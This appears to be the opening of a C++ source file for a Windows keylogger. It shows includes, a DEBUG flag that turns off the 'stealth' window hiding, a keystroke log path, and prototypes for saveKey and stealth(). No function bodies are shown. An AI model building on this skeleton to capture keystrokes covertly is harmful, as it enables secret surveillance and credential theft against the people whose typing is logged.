#include <iostream>
#include <fstream>
#include <string>
#include <time.h>
#include <Windows.h>
#include <winuser.h>

using namespace std;

/*
* DEBUG global var
*
* When is activated the windows does not stealth
* and some output will appear on it
*/
bool DEBUG = true;

char *LOG_PATH_NAME = "LOG.txt";

// Function headers
int saveKey(int key_stroke, ofstream *file);
void stealth();
void initialize(ofstream *file);
const string currentDateTime();